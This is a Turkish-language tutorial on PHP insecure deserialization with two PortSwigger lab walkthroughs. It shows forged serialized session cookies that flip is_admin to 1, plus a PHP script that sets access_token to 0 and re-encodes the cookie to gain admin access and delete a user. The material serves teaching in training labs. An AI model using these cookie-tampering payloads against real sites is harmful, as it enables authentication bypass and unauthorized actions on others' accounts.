<h1 align="center">Deserialization Zafiyetleri</h1>


# Serialization & Deserialization


* Kullanıcı ve web uygulaması arasındaki ilişkiyi biliyoruz. Bir request response döngüsü barındırıyordu;

![alt text](<WebSec101 0x0C_ss/image.png>)

* Burada kullanıcının bir web sitesine girip kaydolduğunu düşünelim. Bu durumda web uygulaması da kullanıcı bilgilerini bir şekilde kaydetmelidir. Aksi takdirde siteye her girişte tekrardan kayıt yaptırmak gerekir. İşte kullanıcının yaptığı işlem verilerinin kaydedilmesi işi **serialization** ile sağlanır. Yani kullanıcının bilgileri **serialize(sıralama, dizi halinde)** edilir. php dilinden bir örnek; 

```php

<?php

class User{
    var $firstname;
    var $lastname;

    function _construct($firstname= "", $lastname=""){
        $this->firstname=$firstname;
        $this->lastname=$lastname;
    }

    function __toString(){
        return $this->firstname." ".$this->lastname."\n";
    }
}
// User'a ait bilgiler db'den sessionId ile elde edildi. 
// ve User sınıfı oluşturuldu.
$user = new User("Mehmet","INCE");
``` 

* Yukarıdaki kodda bir sınıf tanımlanıyor(**User**). Bu sınıfta 2 tane property(**$firstname ve $lastname**) yani özellik var. 

* Sınıfın içinde bir de fonksiyon(**_construct**) var. Bu fonksiyon verilen property değişkenlerini sınıf özelliklerine(**$this->firstname ve $this->lastname**) atıyor.

* **__toString** fonksiyonu da consola girilen değerleri yazmak için var. Yani print() fonksiyonu gibi düşebiliriz. Çıktıyı görmemizi sağlıyor. 

* En sonda da tanımladığımız sınıf(**User**) kullanılarak bir sınıf örneği($user) oluşturulmuş. Bu örnekte **firstname** parametresi **MEHMET**, **lastname** parametresi de **INCE** string değerlerini alıyor. 


Şimdi aslında kullanıcı bilgileri **$user** olarak tanımlanan sınıf örneğinde tutuluyor. Bu sınıf örneği kullanıcan request gittiğinde oluşturulmuş oluyor. Dolayısıyla bir yerde tutulması lazım. Aksi takdirde kullanıcı her işleminde aynı bilgileri girmek zorunda kalacaktır. Ancak kullanıcı bir şekilde **$user** objesine erişebilirse o zaman bilgileri kaybolmayacaktır. 

* Yukarıdaki kod çalıştırıldığında aşağıdaki gibi bir çıktı alınacaktır;

```
MEHMET INCE 

```

* Şimdi bu çıktı bize gelirken sınıf içerisindeki fonksiyonlar çalıştı ve bize öyle geldi. Ancak bu optimal değil. Çünkü şu anda kullanıcı bu bilgileri yalnızca verdi yani bir sonraki sefer web uygulamasına request yolladığında tekrardan girecek ve tekrardan fonksiyonlar çalışacaktır. 

* Yapılması gereken kullanıcı bilgilerinin serialize edilmesidir ki kullanıcı tekrardan **request** yolladığında **$user** objesine tekrardan erişebilsin ve işlemleri aksamasın. Yani tekrardan bu bilgileri girmesi gerekmesin;

* Şimdi serialize etmek için bir kod yazacağız ama daha düzenli olsun diye kodu sayfalara bölelim;

```php

user.class.php dosyası:

<?php

class User{
    var $firstname;
    var $lastname;

    function __construct($firstname= "", $lastname=""){
        $this->firstname=$firstname;
        $this->lastname=$lastname;
    }
    function __toString(){
        return $this->firstname." ".$this->lastname."\n";
    }
}
```

* Şimdi serialize işlemine devam edebiliriz;

```php

serialize.php dosyası:

<?php

require_once("user.class.php"); //bu php dosyasındaki verileri çağırıyoruz ki bir daha yazmaya uğraşmayalım.

//serialization işlemi
$user = new User("Mehmet","INCE");

$store_somewhere = serialize($user);

echo $store_somewhere;

```

* Yukarıdaki sınıfı serialize etmesi için **$store_somewhere = serialize($user)** şeklinde bir kod eklendi. İşte burdan sonra artık kullanıcının requestindeki veriler serialize edilmiş durumda. Yani kullanıcının bir sonraki requestinde web uygulaması kullanıcının verdiği verileri hatırlayacaktır. Bu kodun çıktısı da;

```php
O:4:"User":2:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";}
```

* **O:4:"User":2**: **O** harfi php objesi olduğunu **4** sayısı da karakter sayısını **:2:** olarak belirtilen de property sayısını gösterir.

* **s:9:"firstname"** olarak yazılan kodda aslında 9 yazan yer 9 harften oluştuğunu gösteriyor. 

Yani bu **class(sınıf)** bilgisini bu şekilde serialize etti.


Şimdi yazılan bu kodu bir de deserialize edelim. Yani serialize etmenin tam tersi;

```php
deserialize.php dosyası:

<?php

require_once("user.class.php"); //bu php dosyasındaki verileri çağırıyoruz ki bir daha yazmaya uğraşmayalım.

$deserialize_str = 'O:4:"User":2:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";}'; //serialize dosyasından elde ettiğimiz string'i burada kullanıyoruz.
$user = unserialize($deserialize_str);

echo $user;
``` 

* Yukarıda serialize ettiğimiz sınıfın bize çıktı olarak ürettiği değeri kopyalayıp **$deserialize_str** değişkenine atadık. Sonra bu değişkeni de **unserialize** fonksiyonunun içerisine koyduk ki deserialize işlemi yapılsın.

* Bu kod çalıştığındaki çıktı;

```
MEHMET INCE
```

* Şeklinde olacaktır. Artık kullanıcı bilgileri yine hatırlanmıyor ve ilk baştaki haline dönmüş oluyor. 

* Şimdi **user.class.php** dosyasına bazı eklemeler yapalım;

```php

user.class.php dosyası:

class User{
    var $firstname;
    var $lastname;

    function _construct($firstname= "", $lastname=""){
        $this->firstname=$firstname;
        $this->lastname=$lastname;
    }

    function __toString(){
        return $this->firstname." ".$this->lastname."\n";
    }
    
    function __destruct(){
        return echo "Object destruction: ". $this->firstname." ".$this->lastname;
    }

    function __wakeup(){
        echo "SINIF UYANDIRILDI !";
    }

}

```

* **user.class.php** dosyasını bu şekil güncelledik. Şimdi tekrardan **deserialize.php** dosyamızı çalıştırırsak;

```
SINIF UYANDIRILDI !Object Destruction: Mehmet INCE%
``` 
* Şeklinde bir çıktı alacağız. Buradan **deserialize** yaptığımızda **user.class.php** dosyasında oluşturduğumuz **destruct** ve **wakeup** fonksiyonlarının  çalıştığını görebiliyoruz. Buradan aslında **wakeup** fonksiyonunun sınıf oluşturulurken çağrıldığını da görmüş oluyoruz. 

* Şimdi başka bir şey hayal edelim;

* Aşağıdaki **serialize.php** kodunu biraz değiştirdik;

```php

serialize.php dosyası:

<?php

require_once("user.class.php"); //bu php dosyasındaki verileri çağırıyoruz ki bir daha yazmaya uğraşmayalım.

//serialization işlemi
$user = new User("Mehmet","INCE");

$store_somewhere = serialize($user);

$http->set_cookie("User", $store_somewhere);

echo $store_somewhere;


``` 

* Yukarıdaki **$http->set_cookie("User", $store_somewhere);** kod user objesinin kullanıcının cookiesinde taşımasını sağlıyor. Burada web uygulaması kendi içerisinde saklamak yerine daha verimli ve optimize olan böyle bir yönteme başvurabilir.

* Bu koddaki değişiklik deserialize'da devam ediyor;

```php
deserialize.php dosyası:

<?php

require_once("user.class.php"); //bu php dosyasındaki verileri çağırıyoruz ki bir daha yazmaya uğraşmayalım.

$deserialize_str = $payload; //UNTRUSTED SOURCE (Güvensiz Kaynak...)



$user = unserialize($deserialize_str);

echo $user;
``` 

* Yukarıdaki **$deserialize_str = $payload;** yazan kodda da aslında güvensiz kaynaktan alınan string **deserialize** edilmiş oluyor. 

* Deserialize edilen payload'un içeriği aslında kullanıcıya verilen cookiede bulunan içerik olduğunda;

```php
deserialize.php dosyası:

<?php

require_once("user.class.php"); //bu php dosyasındaki verileri çağırıyoruz ki bir daha yazmaya uğraşmayalım.

$payload; //UNTRUSTED SOURCE (Güvensiz Kaynak...)

$payload = 'O:4:"MDISEC":2:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";}';


$user = unserialize($deserialize_str);

echo $user;
``` 

* Kullanıcı payload'un içerisindeki stringi düzenleyebilir. Bu sayede içerideki verileri manipüle edebilir ve bu tehlikeli bir durumdur(Örn mehmet yerine ahmet yazabilir.). 

* Başka bir örnek ile devam edelim; 

* userclass dosyamızı güncelledik;

```php
user.class.php dosyası
<?php

class User{
    var $firstname;
    var $lastname;
    var $is_admin = 0;

    function __construct($firstname= "", $lastname=""){
        $this->firstname=$firstname;
        $this->lastname=$lastname;
    }
    function __toString(){
        return $this->firstname." ".$this->lastname."\n";
    }
    function __destruct(){
        echo "Object destruction: ".$this->firstname." ".$this->lastname."\n";
    }
    function __wakeup(){
        echo "SINIF UYANDIRILDI !!!";
    }
    public function isAdmin(){
        if($this->is_admin)
            return True;
        return False;
    }
}

class SecretObject{
    var $filename;
    function __wakeup(){
        system("");
    }
}
```

*  **isadmin()** isimli bir **public(herkesin erisebileceği) fonksiyon** eklendi sadece.

* Şimdi objeyi tekrardan serialize edelim;

```
php serialize.php
```

* Çıktı olarak aşağıdaki gelecektir;

```
O:4:"User":3:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";s:8:"is_admin";i:0;}Object destruction: Mehmet INCE
```

* Burada dikkat edersek **is_admin** methodunu da görebiliyoruz. Yani aslında kullanıcı bu komutu da kontrol edebilir. 

* Örneğin **"is_admin";i:0** yeri **"is_admin";i:1** yapalım.

* Bununla beraber Deserialize.php dosyası da;

```php

deserialie.php dosyası: 

<?php

require_once("user.class.php"); //bulunduğumuz yerden almasını istiyoruz.

$payload = ""; //UNTRUSTED SOURCE

$payload = 'O:4:"User":3:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";s:8:"is_admin";i:1;}';

$user = unserialize($payload);

echo $user->isAdmin(); //güncellendi.

```

* çalıştırıldığında;

```
1
```

* çıktısını alacağız. 

# Alıştırma #1

* https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects bu alıştırmaya gelelim.

* Bu alıştırmada serialization tabanlı session mekanizması kullanılıyormuş ve bunun bir zafiyeti olduğundan bahsediyor. Buradan muhtemelen userın cookiesinde serialize edilmiş veriyi tutuyor şeklinde bir yorum yapabiliriz. Bizim admin yetkilerini alıp carlos kullanıcısını silmemizi istiyor. 

* Access the lab diyelim ve **wiener:peter** hesap bilgilerini yazalım. Giriş yapmadan **intercept**'i açalım ve öyle giriş yapma tuşuna basalım;

![alt text](<WebSec101 0x0C_ss/image-1.png>)

![alt text](<WebSec101 0x0C_ss/image-2.png>)

* Görüldüğü üzere session bilgisi var ama henüz bir şey tanımlanmamış bu yüzden **Forward** tuşuna basalım;

![alt text](<WebSec101 0x0C_ss/image-3.png>)

![alt text](<WebSec101 0x0C_ss/image-4.png>)

* Evet şimdi bir session tanımlandı ve onu tamamen seçtiğimizde yandaki **Inspector** pencerelerindede decode edilmiş versiyonlarını görüyor olacağız;

![alt text](<WebSec101 0x0C_ss/image-5.png>)

* Evet serialize edilmiş veri tahmin ettiğimiz gibi kullanıcıya(bu durumda bize) gelmiş. 

![alt text](<WebSec101 0x0C_ss/image-6.png>)

* 0 yazan yeri 1 yapalım ve **Apply Changes** diyelim.

* Bunu yaptıktan sonra session'da tanımlanan cookieyi kopyalayalım;

![alt text](<WebSec101 0x0C_ss/image-7.png>)

* Şimdi sitedeki sayfayı yenileyelim ve burp suite'den en yeni request bilgisini(en altta çıkan en yenidir) seçip session kısmına kopyaladığımız kodu yapıştırıp **forward** tuşuna tekrardan tbasalım;

![alt text](<WebSec101 0x0C_ss/image-8.png>)

* Gördüğümüz gibi admin yetkisini aldık çünkü 0 yazan admin yetkisini 1 yapmıştık ve bunu yaptığımız session bilgisini kopyaladık.

* Şimdi admin panele tıklayalım;

![alt text](<WebSec101 0x0C_ss/image-9.png>)

* Evet yeni bir request ekranı geldi. Yine buradaki cookieyi kopyaladığımızla değiştirip **forward** tuşuna basalım;

![alt text](<WebSec101 0x0C_ss/image-10.png>)

* Şimdi carlos'u silelim ve tekrar burpsuite gelip en yeni requesti seçip oradaki session'ı kopyaladığımızla değiştirelim ve forward tuşuna bir daha basalım;

![alt text](<WebSec101 0x0C_ss/image-11.png>)

* Evet carlosu sildik ve tamamladık alıştırmayı.

# Alıştırma #2

* https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types bu adrese geliyoruz.

* Yine session cookieyi kullanarak administrator kullanıcısının hesabına ulaşmamız ve carlosu silmemiz isteniyor. Tek farkı buradaki web uygulamasının authentication(kimlik doğrulaması)'a karşı bir zafiyeti varmış.

* Siteye girelim ve wiener:peter hesabına giriş yapıp Burpsuite'den requesti bulup repeater'a yollayalım;

![alt text](<WebSec101 0x0C_ss/image-12.png>)

* session cookiesinin seçili yerdeki hali; 
**O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dp6pw98voq49xxls7ar4pivg20mzyl49";}** şeklinde. Burada **access_token** dikkat çekiyor. Demek ki burada bir doğrulama ve erişim izni verme söz konusu. Yani bu izini bypass(atlatırsak) edebilirsek o zaman yetki sahibi olabiliriz.   

* Burada kendi sınıfımızı yazarak ilerlemek gerekiyor. Bu sayede uygulamada bulunan session bilgisini serialize etmiş olacağız. 

```php

Modifying-serialized-data-types.php dosyası:
<?php

class User{
    var $username;
    var $access_token;
}

$payload = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"dp6pw98voq49xxls7ar4pivg20mzyl49";}';

$user = unserialize($payload);
$user->access_token = 0;

echo urlencode(
    base64_encode(serialize($user))
);


```

* Yukarıdaki kod siteden aldığımız payload'u **unserialize** ediyor ve sonra **access_token** değerini 0'a çekiyor. Böylece erişim doğrulmasından kurtulmuş oluyoruz. Sonrasında ise  **echo serialize($user);** kodu kullanılarak sınıf tekrardan serialize ediliyor. Bu kodu çalıştırdığımızda aldığımız payload'u da alıştırma sitesinde kullanacağız. Aynı zamanda bu kod **urlencode** ve **base64_encode** şifreleme methodları kullanılarak şifrelenmiş hale getirilecek ve biz de bunu sitede session kısmında kullanabileceğiz;

```

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ%3D%3D

```

* Şimdi bu cookieyi kopyalayalım ve burpsuite'e gelip **intercept**'i açalım ardından sayfayı yenileyelim;

* Gelen yeni requesti seçip kopyaladığımız cookieyi buraya yapıştırıp forward tuşuna basalım;

![alt text](<WebSec101 0x0C_ss/image-16.png>)

* Admin panel gözüküyor. 

* Aynı yöntemi uygulayarak carlos kullanıcısını silip alıştırmayı tamamlayalım. 


# KAYNAK

https://www.mehmetince.net/php-object-injection-saldirilari-ve-korunmasi/

[Web Security 0x0C | Deserialization Zafiyetlerini Anlamak Episode 2
](https://www.youtube.com/watch?v=wvNGCBDbENY&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&index=16)
